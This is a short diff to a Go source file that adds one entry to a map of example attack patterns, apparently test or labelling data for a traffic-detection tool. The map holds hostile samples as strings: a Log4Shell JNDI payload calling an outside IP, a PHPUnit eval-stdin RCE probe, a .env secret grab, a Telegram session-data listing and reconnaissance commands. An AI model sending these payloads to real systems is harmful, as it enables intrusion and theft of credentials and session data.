@@ -52,6 +52,7 @@ var patternExamples = map[string]string{
 	"recon":            "uname -a; cat /proc/cpuinfo | grep name | wc -l",
 	"data_theft":       "ls -la ~/.local/share/TelegramDesktop/tdata",
 	"log4shell":        "/?x=${jndi:ldap://203.0.113.9/a}",
+	"java4shell":       "/login\n\nAuthorization: Basic " + strings.Repeat("A", 64) + "=",
 	"web_rce":          "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
 	"secret_hunt":      "/.env",
 	"iot_exploit":      "/boaform/admin/formLogin",
